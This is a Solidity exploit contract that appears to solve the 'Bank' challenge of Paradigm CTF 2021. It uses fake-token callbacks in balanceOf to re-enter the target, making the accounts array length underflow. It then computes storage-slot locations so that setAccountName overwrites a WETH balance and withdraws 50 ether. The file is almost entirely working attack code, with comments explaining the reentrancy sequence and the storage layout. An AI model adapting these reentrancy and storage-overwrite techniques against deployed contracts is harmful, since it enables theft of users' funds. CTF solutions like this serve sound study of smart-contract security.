// SPDX-License-Identifier: MIT
pragma solidity 0.4.24;

import "./Setup.sol";
import "hardhat/console.sol";

contract BankAttacker {

    Setup setup;
    Bank bank;
    uint counter;
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
        bank = Bank(setup.bank());
    }

    function getArrayLocation(
        uint256 slot,
        uint256 index,
        uint256 elementSize
    ) public pure returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);
    }

    function getMapLocation(uint256 slot, uint256 key)
        public
        pure
        returns (uint256)
    {
        return uint256(keccak256(abi.encodePacked(key, slot)));
    }

    function getAccountLocation(uint256 accountId)
        public
        view
        returns (uint256)
    {
        // gets accounts[addr][accountId].accountName
        // = keccak(keccak(addr . 2)) + 3 * accountId (if string size < 32)
        // need to convert address(this) to uint256 first (!!)
        uint256 slot =
            uint256(
                keccak256(abi.encodePacked(uint256(address(this)), uint256(2)))
            );
        slot = uint256(keccak256(slot));
        slot += accountId * 3;
        return slot;
    }

    function attack() public {
        // 1. Make accounts[address(this)].length == uint_max-1.
        bank.depositToken(0, address(this), 0);

        // 2. Set an account balance (by `bank.setAccountName()`).
        // accounts[address(this)][0].balances[weth];
        // accountStructSlot (accountNameSlot) = keccak256(keccak(address(this) . uint(2)) + 3 * accountId
        // balanceSlot = keccak (address(weth) . (accountStructSlot + 2))
        //             = keccak (address(weth) . keccak256(keccak(address(this) . uint(2)) + 3 * accountId + 2)

        uint256 accountId = 5;
        uint256 delta = getAccountLocation(0);
        uint256 balanceSlot = getMapLocation(delta + 3 * accountId + 2, uint256(address(weth)));

        require((balanceSlot - delta) % 3 == 0, "Invalid accountId.");
        uint256 manipulateId = (balanceSlot - delta) / 3;

        // https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#bytes-and-string
        // Strings are stored inline for shorter than 32 bytes (each byte = 1 char).
        bank.setAccountName(manipulateId, "AAAAAAAAAAAA");
        uint256 wethBalance = bank.getAccountBalance(accountId, address(weth));
        console.log("balance %s", wethBalance);
        bank.withdrawToken(accountId, weth, 50 ether);
    }

    function transfer(address dst, uint qty) public returns (bool) {
        return true;
    }
    function transferFrom(address src, address dst, uint qty) public returns (bool) {
        return true;
    }
    function approve(address dst, uint qty) public returns (bool) {
        return true;
    }
    // https://cmichel.io/paradigm-ctf-2021-solutions/
    // deposit(0, address(this), 0) // re-enter on first balance,
    //     withdraw(0, address(this), 0) // re-enter on first balance,
    //         deposit(0, address(this), 0) // re-enter on first balance,
    //               closeLastAccount() // (passes .length > 0 && uniqueTokens == 0)
    //         deposit continues execution and sets uniqueTokens to 1
    //     withdraw continues execution and deletes account again (passes uniqueTokens == 1 check)
    // deposit continues execution and we do not care about what it does
    function balanceOf(address who) public view returns (uint) {
        if (counter == 0) {
            counter++;
            bank.withdrawToken(0, address(this), 0);
        } else if (counter == 1) {
            counter++;
            bank.depositToken(0, address(this), 0);
        } else if (counter == 2) {
            counter++;
            bank.closeLastAccount();
        }
        return 0;
    }
}
